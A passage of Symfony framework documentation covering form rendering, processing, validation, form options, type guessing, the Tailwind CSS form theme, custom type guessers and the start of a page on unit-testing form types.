            $task = new Task();
            // ...

            $form = $this->createForm(TaskType::class, $task);

            return $this->render('task/new.html.twig', [
                'form' => $form,
            ]);
        }
    }

Internally, the ``render()`` method calls ``$form->createView()`` to
transform the form into a *form view* instance.

Then, use some :ref:`form helper functions <reference-form-twig-functions>` to
render the form contents:

.. code-block:: twig

    {# templates/task/new.html.twig #}
    {{ form(form) }}

That's it! The :ref:`form() function <reference-forms-twig-form>` renders all
fields *and* the ``<form>`` start and end tags. By default, the form method is
``POST`` and the target URL is the same that displayed the form, but
:ref:`you can change both <forms-change-action-method>`.

Notice how the rendered ``task`` input field has the value of the ``task``
property from the ``$task`` object (i.e. "Write a blog post"). This is the first
job of a form: to take data from an object and translate it into a format that's
suitable for being rendered in an HTML form.

.. tip::

    The form system is smart enough to access the value of the protected
    ``task`` property via the ``getTask()`` and ``setTask()`` methods on the
    ``Task`` class. Unless a property is public, it *must* have a "getter" and
    "setter" method so that Symfony can get and put data onto the property. For
    a boolean property, you can use an "isser" or "hasser" method (e.g.
    ``isPublished()`` or ``hasReminder()``) instead of a getter (e.g.
    ``getPublished()`` or ``getReminder()``).

As short as this rendering is, it's not very flexible. Usually, you'll need more
control about how the entire form or some of its fields look. For example, thanks
to the :doc:`Bootstrap 5 integration with Symfony forms </form/bootstrap5>` you
can set this option to generate forms compatible with the Bootstrap 5 CSS framework:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/twig.yaml
        twig:
            form_themes: ['bootstrap_5_layout.html.twig']

    .. code-block:: xml

        <!-- config/packages/twig.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:twig="http://symfony.com/schema/dic/twig"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig
                https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <twig:form-theme>bootstrap_5_layout.html.twig</twig:form-theme>
                <!-- ... -->
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            $twig->formThemes(['bootstrap_5_layout.html.twig']);

            // ...
        };

The :ref:`built-in Symfony form themes <symfony-builtin-forms>` include
Bootstrap 3, 4 and 5, Foundation 5 and 6, as well as Tailwind 2. You can also
:ref:`create your own Symfony form theme <create-your-own-form-theme>`.

In addition to form themes, Symfony allows you to
:doc:`customize the way fields are rendered </form/form_customization>` with
multiple functions to render each field part separately (widgets, labels,
errors, help messages, etc.)

.. _processing-forms:

Processing Forms
----------------

The :ref:`recommended way of processing forms <best-practice-handle-form>` is to
use a single action for both rendering the form and handling the form submit.
You can use separate actions, but using one action simplifies everything while
keeping the code concise and maintainable.

Processing a form means to translate user-submitted data back to the properties
of an object. To make this happen, the submitted data from the user must be
written into the form object::

    // src/Controller/TaskController.php

    // ...
    use Symfony\Component\HttpFoundation\Request;

    class TaskController extends AbstractController
    {
        public function new(Request $request): Response
        {
            // just set up a fresh $task object (remove the example data)
            $task = new Task();

            $form = $this->createForm(TaskType::class, $task);

            $form->handleRequest($request);
            if ($form->isSubmitted() && $form->isValid()) {
                // $form->getData() holds the submitted values
                // but, the original `$task` variable has also been updated
                $task = $form->getData();

                // ... perform some action, such as saving the task to the database

                return $this->redirectToRoute('task_success');
            }

            return $this->render('task/new.html.twig', [
                'form' => $form,
            ]);
        }
    }

This controller follows a common pattern for handling forms and has three
possible paths:

#. When initially loading the page in a browser, the form hasn't been submitted
   yet and ``$form->isSubmitted()`` returns ``false``. So, the form is created
   and rendered;

#. When the user submits the form, :method:`Symfony\\Component\\Form\\FormInterface::handleRequest`
   recognizes this and immediately writes the submitted data back into the
   ``task`` and ``dueDate`` properties of the ``$task`` object. Then this object
   is validated (validation is explained in the next section). If it is invalid,
   :method:`Symfony\\Component\\Form\\FormInterface::isValid` returns
   ``false`` and the form is rendered again, but now with validation errors.

   By passing ``$form`` to the ``render()`` method (instead of
   ``$form->createView()``), the response code is automatically set to
   `HTTP 422 Unprocessable Content`_. This ensures compatibility with tools
   relying on the HTTP specification, like `Symfony UX Turbo`_;

#. When the user submits the form with valid data, the submitted data is again
   written into the form, but this time :method:`Symfony\\Component\\Form\\FormInterface::isValid`
   returns ``true``. Now you have the opportunity to perform some actions using
   the ``$task`` object (e.g. persisting it to the database) before redirecting
   the user to some other page (e.g. a "thank you" or "success" page);

.. note::

    Redirecting a user after a successful form submission is a best practice
    that prevents the user from being able to hit the "Refresh" button of
    their browser and re-post the data.

.. seealso::

    If you need more control over exactly when your form is submitted or which
    data is passed to it, you can
    :doc:`use the submit() method to handle form submissions </form/direct_submit>`.

.. _validating-forms:

Validating Forms
----------------

In the previous section, you learned how a form can be submitted with valid
or invalid data. In Symfony, the question isn't whether the "form" is valid, but
whether or not the underlying object (``$task`` in this example) is valid after
the form has applied the submitted data to it. Calling ``$form->isValid()`` is a
shortcut that asks the ``$task`` object whether or not it has valid data.

Before using validation, add support for it in your application:

.. code-block:: terminal

    $ composer require symfony/validator

Validation is done by adding a set of rules, called (validation) constraints,
to a class. You can add them either to the entity class or by using the
:ref:`constraints option <reference-form-option-constraints>` of form types.

To see the first approach - adding constraints to the entity - in action,
add the validation constraints, so that the ``task`` field cannot be empty,
and the ``dueDate`` field cannot be empty, and must be a valid ``DateTimeImmutable``
object.

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/Task.php
        namespace App\Entity;

        use Symfony\Component\Validator\Constraints as Assert;

        class Task
        {
            #[Assert\NotBlank]
            public string $task;

            #[Assert\NotBlank]
            #[Assert\Type(\DateTimeInterface::class)]
            protected \DateTimeInterface $dueDate;
        }

    .. code-block:: yaml

        # config/validator/validation.yaml
        App\Entity\Task:
            properties:
                task:
                    - NotBlank: ~
                dueDate:
                    - NotBlank: ~
                    - Type: \DateTimeInterface

    .. code-block:: xml

        <!-- config/validator/validation.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <constraint-mapping xmlns="http://symfony.com/schema/dic/constraint-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/constraint-mapping
                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd">

            <class name="App\Entity\Task">
                <property name="task">
                    <constraint name="NotBlank"/>
                </property>
                <property name="dueDate">
                    <constraint name="NotBlank"/>
                    <constraint name="Type">\DateTimeInterface</constraint>
                </property>
            </class>
        </constraint-mapping>

    .. code-block:: php

        // src/Entity/Task.php
        namespace App\Entity;

        use Symfony\Component\Validator\Constraints\NotBlank;
        use Symfony\Component\Validator\Constraints\Type;
        use Symfony\Component\Validator\Mapping\ClassMetadata;

        class Task
        {
            // ...

            public static function loadValidatorMetadata(ClassMetadata $metadata): void
            {
                $metadata->addPropertyConstraint('task', new NotBlank());

                $metadata->addPropertyConstraint('dueDate', new NotBlank());
                $metadata->addPropertyConstraint(
                    'dueDate',
                    new Type(\DateTimeInterface::class)
                );
            }
        }

That's it! If you re-submit the form with invalid data, you'll see the
corresponding errors printed out with the form.

To see the second approach - adding constraints to the form - refer to
:ref:`this section <form-option-constraints>`. Both approaches can be used together.

Other Common Form Features
--------------------------

Passing Options to Forms
~~~~~~~~~~~~~~~~~~~~~~~~

If you :ref:`create forms in classes <creating-forms-in-classes>`, when building
the form in the controller you can pass custom options to it as the third optional
argument of ``createForm()``::

    // src/Controller/TaskController.php
    namespace App\Controller;

    use App\Form\Type\TaskType;
    // ...

    class TaskController extends AbstractController
    {
        public function new(): Response
        {
            $task = new Task();
            // use some PHP logic to decide if this form field is required or not
            $dueDateIsRequired = ...;

            $form = $this->createForm(TaskType::class, $task, [
                'require_due_date' => $dueDateIsRequired,
            ]);

            // ...
        }
    }

If you try to use the form now, you'll see an error message: *The option
"require_due_date" does not exist.* That's because forms must declare all the
options they accept using the ``configureOptions()`` method::

    // src/Form/Type/TaskType.php
    namespace App\Form\Type;

    use Symfony\Component\OptionsResolver\OptionsResolver;
    // ...

    class TaskType extends AbstractType
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                // ...,
                'require_due_date' => false,
            ]);

            // you can also define the allowed types, allowed values and
            // any other feature supported by the OptionsResolver component
            $resolver->setAllowedTypes('require_due_date', 'bool');
        }
    }

Now you can use this new form option inside the ``buildForm()`` method::

    // src/Form/Type/TaskType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\DateType;
    use Symfony\Component\Form\FormBuilderInterface;

    class TaskType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                // ...
                ->add('dueDate', DateType::class, [
                    'required' => $options['require_due_date'],
                ])
            ;
        }

        // ...
    }

Form Type Options
~~~~~~~~~~~~~~~~~

Each :ref:`form type <form-types>` has a number of options to configure it, as
explained in the :doc:`Symfony form types reference </reference/forms/types>`.
Two commonly used options are ``required`` and ``label``.

The ``required`` Option
.......................

The most common option is the ``required`` option, which can be applied to any
field. By default, this option is set to ``true``, meaning that HTML5-ready
browsers will require you to fill in all fields before submitting the form.

If you don't want this behavior, either
:ref:`disable client-side validation <forms-html5-validation-disable>` for the
entire form or set the ``required`` option to ``false`` on one or more fields::

    ->add('dueDate', DateType::class, [
        'required' => false,
    ])

The ``required`` option does not perform any server-side validation. If a user
submits a blank value for the field (either with an old browser or a web
service, for example), it will be accepted as a valid value unless you also use
Symfony's ``NotBlank`` or ``NotNull`` validation constraints.

The ``label`` Option
....................

By default, the label of form fields are the *humanized* version of the
property name (``user`` -> ``User``; ``postalAddress`` -> ``Postal Address``).
Set the ``label`` option on fields to define their labels explicitly::

    ->add('dueDate', DateType::class, [
        // set it to FALSE to not display the label for this field
        'label' => 'To Be Completed Before',
    ])

.. tip::

    By default, ``<label>`` tags of required fields are rendered with a
    ``required`` CSS class, so you can display an asterisk by applying a CSS style:

    .. code-block:: css

        label.required:before {
            content: "*";
        }

.. _forms-change-action-method:

Changing the Action and HTTP Method
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, the ``<form>`` tag is rendered with a ``method="post"`` attribute,
and no ``action`` attribute. This means that the form is submitted via an HTTP
POST request to the same URL under which it was rendered. When building the form,
use the ``setAction()`` and ``setMethod()`` methods to change this::

    // src/Controller/TaskController.php
    namespace App\Controller;

    // ...
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\Form\Extension\Core\Type\DateType;
    use Symfony\Component\Form\Extension\Core\Type\SubmitType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;

    class TaskController extends AbstractController
    {
        public function new(): Response
        {
            // ...

            $form = $this->createFormBuilder($task)
                ->setAction($this->generateUrl('target_route'))
                ->setMethod('GET')
                // ...
                ->getForm();

            // ...
        }
    }

When building the form in a class, pass the action and method as form options::

    // src/Controller/TaskController.php
    namespace App\Controller;

    use App\Form\TaskType;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    // ...

    class TaskController extends AbstractController
    {
        public function new(): Response
        {
            // ...

            $form = $this->createForm(TaskType::class, $task, [
                'action' => $this->generateUrl('target_route'),
                'method' => 'GET',
            ]);

            // ...
        }
    }

Finally, you can override the action and method in the template by passing them
to the ``form()`` or the ``form_start()`` helper functions:

.. code-block:: twig

    {# templates/task/new.html.twig #}
    {{ form_start(form, {'action': path('target_route'), 'method': 'GET'}) }}

.. note::

    If the form's method is not ``GET`` or ``POST``, but ``PUT``, ``PATCH`` or
    ``DELETE``, Symfony will insert a hidden field with the name ``_method``
    that stores this method. The form will be submitted in a normal ``POST``
    request, but :doc:`Symfony's routing </routing>` is capable of detecting the
    ``_method`` parameter and will interpret it as a ``PUT``, ``PATCH`` or
    ``DELETE`` request. The :ref:`configuration-framework-http_method_override`
    option must be enabled for this to work.

Changing the Form Name
~~~~~~~~~~~~~~~~~~~~~~

If you inspect the HTML contents of the rendered form, you'll see that the
``<form>`` name and the field names are generated from the type class name
(e.g. ``<form name="task" ...>`` and ``<select name="task[dueDate][date][month]" ...>``).

If you want to modify this, use the :method:`Symfony\\Component\\Form\\FormFactoryInterface::createNamed`
method::

    // src/Controller/TaskController.php
    namespace App\Controller;

    use App\Form\TaskType;
    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
    use Symfony\Component\Form\FormFactoryInterface;
    // ...

    class TaskController extends AbstractController
    {
        public function new(FormFactoryInterface $formFactory): Response
        {
            $task = ...;
            $form = $formFactory->createNamed('my_name', TaskType::class, $task);

            // ...
        }
    }

You can even suppress the name completely by setting it to an empty string.

.. _forms-html5-validation-disable:

Client-Side HTML Validation
~~~~~~~~~~~~~~~~~~~~~~~~~~~

Thanks to HTML5, many browsers can natively enforce certain validation
constraints on the client side. The most common validation is activated by
adding a ``required`` attribute on fields that are required. For browsers
that support HTML5, this will result in a native browser message being displayed
if the user tries to submit the form with that field blank.

Generated forms take full advantage of this new feature by adding sensible HTML
attributes that trigger the validation. The client-side validation, however, can
be disabled by adding the ``novalidate`` attribute to the ``<form>`` tag or
``formnovalidate`` to the submit tag. This is especially useful when you want to
test your server-side validation constraints, but are being prevented by your
browser from, for example, submitting blank fields.

.. code-block:: twig

    {# templates/task/new.html.twig #}
    {{ form_start(form, {'attr': {'novalidate': 'novalidate'}}) }}
        {{ form_widget(form) }}
    {{ form_end(form) }}

.. _form-type-guessing:

Form Type Guessing
~~~~~~~~~~~~~~~~~~

If the object handled by the form includes validation constraints, Symfony can
introspect that metadata to guess the type of your field.
In the above example, Symfony can guess from the validation rules that the
``task`` field is a normal ``TextType`` field and the ``dueDate`` field is a
``DateType`` field.

To enable Symfony's "guessing mechanism", omit the second argument to the ``add()`` method, or
pass ``null`` to it::

    // src/Form/Type/TaskType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\DateType;
    use Symfony\Component\Form\Extension\Core\Type\SubmitType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;

    class TaskType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                // if you don't define field options, you can omit the second argument
                ->add('task')
                // if you define field options, pass NULL as second argument
                ->add('dueDate', null, ['required' => false])
                ->add('save', SubmitType::class)
            ;
        }
    }

.. caution::

    When using a specific :doc:`form validation group </form/validation_groups>`,
    the field type guesser will still consider *all* validation constraints when
    guessing your field types (including constraints that are not part of the
    validation group(s) being used).

Form Type Options Guessing
..........................

When the guessing mechanism is enabled for some field, in addition to its form type,
the following options will be guessed too:

``required``
    The ``required`` option is guessed based on the validation rules (i.e. is
    the field ``NotBlank`` or ``NotNull``) or the Doctrine metadata (i.e. is the
    field ``nullable``). This is very useful, as your client-side validation will
    automatically match your validation rules.

``maxlength``
    If the field is some sort of text field, then the ``maxlength`` option attribute
    is guessed from the validation constraints (if ``Length`` or ``Range`` is used)
    or from the :doc:`Doctrine </doctrine>` metadata (via the field's length).

If you'd like to change one of the guessed values, override it in the options field array::

    ->add('task', null, ['attr' => ['maxlength' => 4]])

.. seealso::

    Besides guessing the form type, Symfony also guesses :ref:`validation constraints <validating-forms>`
    if you're using a Doctrine entity. Read :ref:`automatic_object_validation`
    guide for more information.

Unmapped Fields
~~~~~~~~~~~~~~~

When editing an object via a form, all form fields are considered properties of
the object. Any fields on the form that do not exist on the object will cause an
exception to be thrown.

If you need extra fields in the form that won't be stored in the object (for
example to add an *"I agree with these terms"* checkbox), set the ``mapped``
option to ``false`` in those fields::

    // ...
    use Symfony\Component\Form\Extension\Core\Type\CheckboxType;
    use Symfony\Component\Form\Extension\Core\Type\SubmitType;
    use Symfony\Component\Form\FormBuilderInterface;

    class TaskType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('task')
                ->add('dueDate')
                ->add('agreeTerms', CheckboxType::class, ['mapped' => false])
                ->add('save', SubmitType::class)
            ;
        }
    }

These "unmapped fields" can be set and accessed in a controller with::

    $form->get('agreeTerms')->getData();
    $form->get('agreeTerms')->setData(true);

Additionally, if there are any fields on the form that aren't included in
the submitted data, those fields will be explicitly set to ``null``.

Learn more
----------

When building forms, keep in mind that the first goal of a form is to translate
data from an object (``Task``) to an HTML form so that the user can modify that
data. The second goal of a form is to take the data submitted by the user and to
re-apply it to the object.

There's a lot more to learn and a lot of *powerful* tricks in the Symfony forms:

Reference:

.. toctree::
    :maxdepth: 1

    /reference/forms/types

Advanced Features:

.. toctree::
    :maxdepth: 1

    /controller/upload_file
    /security/csrf
    /form/form_dependencies
    /form/create_custom_field_type
    /form/data_transformers
    /form/data_mappers
    /form/create_form_type_extension
    /form/type_guesser

Form Themes and Customization:

.. toctree::
    :maxdepth: 1

    /form/bootstrap4
    /form/bootstrap5
    /form/tailwindcss
    /form/form_customization
    /form/form_themes

Events:

.. toctree::
    :maxdepth: 1

    /form/events
    /form/dynamic_form_modification

Validation:

.. toctree::
    :maxdepth: 1

    /form/validation_groups
    /form/validation_group_service_resolver
    /form/button_based_validation
    /form/disabling_validation

Misc.:

.. toctree::
    :maxdepth: 1

    /form/direct_submit
    /form/embedded
    /form/form_collections
    /form/inherit_data_option
    /form/multiple_buttons
    /form/unit_testing
    /form/use_empty_data
    /form/without_class

.. _`Symfony Forms screencast series`: https://symfonycasts.com/screencast/symfony-forms
.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html
.. _`HTTP 422 Unprocessable Content`: https://www.rfc-editor.org/rfc/rfc9110.html#name-422-unprocessable-content
.. _`Symfony UX Turbo`: https://ux.symfony.com/turbo
Tailwind CSS Form Theme
=======================

Symfony provides a minimal form theme for `Tailwind CSS`_. Tailwind is a *utility first*
CSS framework and provides *unlimited ways* to customize your forms. Tailwind has
an official `form plugin`_ that provides a basic form reset that standardizes their look
on all browsers. This form theme requires this plugin and adds a few basic tailwind
classes so out of the box, your forms will look decent. Customization is almost always
going to be required so this theme makes that easy.

.. image:: /_images/form/tailwindcss-form.png
    :alt: An HTML form showing a range of form types styled using TailwindCSS.

To use, first be sure you have installed and integrated `Tailwind CSS`_ and the
`form plugin`_. Follow their respective documentation to install both packages.

If you prefer to use the Tailwind theme on a form by form basis, include the
``form_theme`` tag in the templates where those forms are used:

.. code-block:: html+twig

    {# ... #}
    {# this tag only applies to the forms defined in this template #}
    {% form_theme form 'tailwind_2_layout.html.twig' %}

    {% block body %}
        <h1>User Sign Up:</h1>
        {{ form(form) }}
    {% endblock %}

Customization
-------------

Customizing CSS classes is especially important for this theme.

Twig Form Functions
~~~~~~~~~~~~~~~~~~~

You can customize classes of individual fields by setting some class options.

.. code-block:: twig

    {{ form_row(form.title, {
        row_class: 'my row classes',
        label_class: 'my label classes',
        error_item_class: 'my error item classes',
        widget_class: 'my widget classes',
        widget_disabled_class: 'my disabled widget classes',
        widget_errors_class: 'my widget with error classes',
    }) }}

When customizing the classes this way the defaults provided by the theme
are *overridden* opposed to merged as is the case with other themes. This
enables you to take full control of the classes without worrying about
*undoing* the generic defaults the theme provides.

Project Specific Form Layout
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you have a generic Tailwind style for all your forms, you can create
a custom form theme using the Tailwind CSS theme as a base.

.. code-block:: twig

    {% use 'tailwind_2_layout.html.twig' %}

    {%- block form_row -%}
        {%- set row_class = row_class|default('my row classes') -%}
        {{- parent() -}}
    {%- endblock form_row -%}

    {%- block widget_attributes -%}
        {%- set widget_class = widget_class|default('my widget classes') -%}
        {%- set widget_disabled_class = widget_disabled_class|default('my disabled widget classes') -%}
        {%- set widget_errors_class = widget_errors_class|default('my widget with error classes') -%}
        {{- parent() -}}
    {%- endblock widget_attributes -%}

    {%- block form_label -%}
        {%- set label_class = label_class|default('my label classes') -%}
        {{- parent() -}}
    {%- endblock form_label -%}

    {%- block form_help -%}
        {%- set help_class = help_class|default('my label classes') -%}
        {{- parent() -}}
    {%- endblock form_help -%}

    {%- block form_errors -%}
        {%- set error_item_class = error_item_class|default('my error item classes') -%}
        {{- parent() -}}
    {%- endblock form_errors -%}

.. _`Tailwind CSS`: https://tailwindcss.com
.. _`form plugin`: https://github.com/tailwindlabs/tailwindcss-forms
Creating a custom Type Guesser
==============================

The Form component can guess the type and some options of a form field by
using type guessers. The component already includes a type guesser using the
assertions of the Validation component, but you can also add your own custom
type guessers.

.. sidebar:: Form Type Guessers in the Bridges

    Symfony also provides some form type guessers in the bridges:

    * :class:`Symfony\\Bridge\\Doctrine\\Form\\DoctrineOrmTypeGuesser`
      provided by the Doctrine bridge.

Guessers are used only in the following cases:

* Using
  :method:`Symfony\\Component\\Form\\FormFactoryInterface::createForProperty`
  or
  :method:`Symfony\\Component\\Form\\FormFactoryInterface::createBuilderForProperty`;
* Calling :method:`Symfony\\Component\\Form\\FormInterface::add` or
  :method:`Symfony\\Component\\Form\\FormBuilderInterface::create` or
  :method:`Symfony\\Component\\Form\\FormBuilderInterface::add` without an
  explicit type, in a context where the parent form has defined a data class.

Create a PHPDoc Type Guesser
----------------------------

In this section, you are going to build a guesser that reads information about
fields from the PHPDoc of the properties. At first, you need to create a class
which implements :class:`Symfony\\Component\\Form\\FormTypeGuesserInterface`.
This interface requires four methods:

:method:`Symfony\\Component\\Form\\FormTypeGuesserInterface::guessType`
    Tries to guess the type of a field;
:method:`Symfony\\Component\\Form\\FormTypeGuesserInterface::guessRequired`
    Tries to guess the value of the :ref:`required <reference-form-option-required>`
    option;
:method:`Symfony\\Component\\Form\\FormTypeGuesserInterface::guessMaxLength`
    Tries to guess the value of the ``maxlength`` input attribute;
:method:`Symfony\\Component\\Form\\FormTypeGuesserInterface::guessPattern`
    Tries to guess the value of the ``pattern`` input attribute.

Start by creating the class and these methods. Next, you'll learn how to fill each in::

    // src/Form/TypeGuesser/PHPDocTypeGuesser.php
    namespace App\Form\TypeGuesser;

    use Symfony\Component\Form\FormTypeGuesserInterface;
    use Symfony\Component\Form\Guess\TypeGuess;
    use Symfony\Component\Form\Guess\ValueGuess;

    class PHPDocTypeGuesser implements FormTypeGuesserInterface
    {
        public function guessType(string $class, string $property): ?TypeGuess
        {
        }

        public function guessRequired(string $class, string $property): ?ValueGuess
        {
        }

        public function guessMaxLength(string $class, string $property): ?ValueGuess
        {
        }

        public function guessPattern(string $class, string $property): ?ValueGuess
        {
        }
    }

Guessing the Type
~~~~~~~~~~~~~~~~~

When guessing a type, the method returns either an instance of
:class:`Symfony\\Component\\Form\\Guess\\TypeGuess` or nothing, to determine
that the type guesser cannot guess the type.

The ``TypeGuess`` constructor requires three options:

* The type name (one of the :doc:`form types </reference/forms/types>`);
* Additional options (for instance, when the type is ``entity``, you also
  want to set the ``class`` option). If no options are guessed, this should be
  set to an empty array;
* The confidence that the guessed type is correct. This can be one of the
  constants of the :class:`Symfony\\Component\\Form\\Guess\\Guess` class:
  ``LOW_CONFIDENCE``, ``MEDIUM_CONFIDENCE``, ``HIGH_CONFIDENCE``,
  ``VERY_HIGH_CONFIDENCE``. After all type guessers have been executed, the
  type with the highest confidence is used.

With this knowledge, you can implement the ``guessType()`` method of the
``PHPDocTypeGuesser``::

    // src/Form/TypeGuesser/PHPDocTypeGuesser.php
    namespace App\Form\TypeGuesser;

    use Symfony\Component\Form\Extension\Core\Type\CheckboxType;
    use Symfony\Component\Form\Extension\Core\Type\IntegerType;
    use Symfony\Component\Form\Extension\Core\Type\NumberType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\Guess\Guess;
    use Symfony\Component\Form\Guess\TypeGuess;

    class PHPDocTypeGuesser implements FormTypeGuesserInterface
    {
        public function guessType(string $class, string $property): ?TypeGuess
        {
            $annotations = $this->readPhpDocAnnotations($class, $property);

            if (!isset($annotations['var'])) {
                return null; // guess nothing if the @var annotation is not available
            }

            // otherwise, base the type on the @var annotation
            return match($annotations['var']) {
                // there is a high confidence that the type is text when
                // @var string is used
                'string' => new TypeGuess(TextType::class, [], Guess::HIGH_CONFIDENCE),

                // integers can also be the id of an entity or a checkbox (0 or 1)
                'int', 'integer' => new TypeGuess(IntegerType::class, [], Guess::MEDIUM_CONFIDENCE),

                'float', 'double', 'real' => new TypeGuess(NumberType::class, [], Guess::MEDIUM_CONFIDENCE),

                'boolean', 'bool' => new TypeGuess(CheckboxType::class, [], Guess::HIGH_CONFIDENCE),

                // there is a very low confidence that this one is correct
                default => new TypeGuess(TextType::class, [], Guess::LOW_CONFIDENCE)
            };
        }

        protected function readPhpDocAnnotations(string $class, string $property): array
        {
            $reflectionProperty = new \ReflectionProperty($class, $property);
            $phpdoc = $reflectionProperty->getDocComment();

            // parse the $phpdoc into an array like:
            // ['var' => 'string', 'since' => '1.0']
            $phpdocTags = ...;

            return $phpdocTags;
        }

        // ...
    }

This type guesser can now guess the field type for a property if it has
PHPDoc!

Guessing Field Options
~~~~~~~~~~~~~~~~~~~~~~

The other three methods (``guessMaxLength()``, ``guessRequired()`` and
``guessPattern()``) return a :class:`Symfony\\Component\\Form\\Guess\\ValueGuess`
instance with the value of the option. This constructor has 2 arguments:

* The value of the option;
* The confidence that the guessed value is correct (using the constants of the
  ``Guess`` class).

``null`` is guessed when you believe the value of the option should not be
set.

.. caution::

    You should be very careful using the ``guessMaxLength()`` method. When the
    type is a float, you cannot determine a length (e.g. you want a float to be
    less than ``5``, ``5.512313`` is not valid but
    ``length(5.512314) > length(5)`` is, so the pattern will succeed). In this
    case, the value should be set to ``null`` with a ``MEDIUM_CONFIDENCE``.

Registering a Type Guesser
--------------------------

If you're using :ref:`autowire <services-autowire>` and
:ref:`autoconfigure <services-autoconfigure>`, you're done! Symfony already knows
and is using your form type guesser.

If you're **not** using autowire and autoconfigure, register your service manually
and tag it with ``form.type_guesser``:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\Form\TypeGuesser\PHPDocTypeGuesser:
                tags: [form.type_guesser]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\Form\TypeGuesser\PHPDocTypeGuesser">
                    <tag name="form.type_guesser"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        use App\Form\TypeGuesser\PHPDocTypeGuesser;

        $container->register(PHPDocTypeGuesser::class)
            ->addTag('form.type_guesser')
        ;

.. sidebar:: Registering a Type Guesser in the Component

    If you're using the Form component standalone in your PHP project, use
    :method:`Symfony\\Component\\Form\\FormFactoryBuilder::addTypeGuesser` or
    :method:`Symfony\\Component\\Form\\FormFactoryBuilder::addTypeGuessers` of
    the ``FormFactoryBuilder`` to register new type guessers::

        use App\Form\TypeGuesser\PHPDocTypeGuesser;
        use Symfony\Component\Form\Forms;

        $formFactory = Forms::createFormFactoryBuilder()
            // ...
            ->addTypeGuesser(new PHPDocTypeGuesser())
            ->getFormFactory();

        // ...

.. tip::

    Run the following command to verify that the form type guesser was
    successfully registered in the application:

    .. code-block:: terminal

        $ php bin/console debug:form
How to Unit Test your Forms
===========================

.. caution::

    This article is intended for developers who create
    :doc:`custom form types </form/create_custom_field_type>`. If you are using
    the :doc:`built-in Symfony form types </reference/forms/types>` or the form
    types provided by third-party bundles, you don't need to unit test them.

The Form component consists of 3 core objects: a form type (implementing
:class:`Symfony\\Component\\Form\\FormTypeInterface`), the
:class:`Symfony\\Component\\Form\\Form` and the
:class:`Symfony\\Component\\Form\\FormView`.

The only class that is usually manipulated by programmers is the form type class
which serves as a form blueprint. It is used to generate the ``Form`` and the
``FormView``. You could test it directly by mocking its interactions with the
factory but it would be complex. It is better to pass it to FormFactory like it
is done in a real application. It is easier to bootstrap and you can trust
the Symfony components enough to use them as a testing base.

There is already a class that you can benefit from for testing:
:class:`Symfony\\Component\\Form\\Test\\TypeTestCase`. It is used to test the
core types and you can use it to test your types too.

.. note::

    Depending on the way you installed your Symfony or Symfony Form component
    the tests may not be downloaded. Use the ``--prefer-source`` option with
    Composer if this is the case.

The Basics
----------

The simplest ``TypeTestCase`` implementation looks like the following::

    // tests/Form/Type/TestedTypeTest.php
    namespace App\Tests\Form\Type;

    use App\Form\Type\TestedType;
    use App\Model\TestObject;
    use Symfony\Component\Form\Test\TypeTestCase;

    class TestedTypeTest extends TypeTestCase
    {
        public function testSubmitValidData(): void
        {
            $formData = [
                'test' => 'test',
                'test2' => 'test2',
            ];

            $model = new TestObject();
            // $model will retrieve data from the form submission; pass it as the second argument
            $form = $this->factory->create(TestedType::class, $model);

            $expected = new TestObject();
            // ...populate $expected properties with the data stored in $formData

            // submit the data to the form directly
            $form->submit($formData);

            // This check ensures there are no transformation failures
            $this->assertTrue($form->isSynchronized());

            // check that $model was modified as expected when the form was submitted
            $this->assertEquals($expected, $model);
        }

        public function testCustomFormView(): void
        {
            $formData = new TestObject();
            // ... prepare the data as you need

            // The initial data may be used to compute custom view variables
            $view = $this->factory->create(TestedType::class, $formData)
                ->createView();

            $this->assertArrayHasKey('custom_var', $view->vars);
            $this->assertSame('expected value', $view->vars['custom_var']);
        }
    }

So, what does it test? Here comes a detailed explanation.

First you verify if the ``FormType`` compiles. This includes basic class
inheritance, the ``buildForm()`` method and options resolution. This should
be the first test you write::

    $form = $this->factory->create(TestedType::class, $formData);

This test checks that none of your data transformers used by the form
produces an error. The :method:`Symfony\\Component\\Form\\FormInterface::isSynchronized`
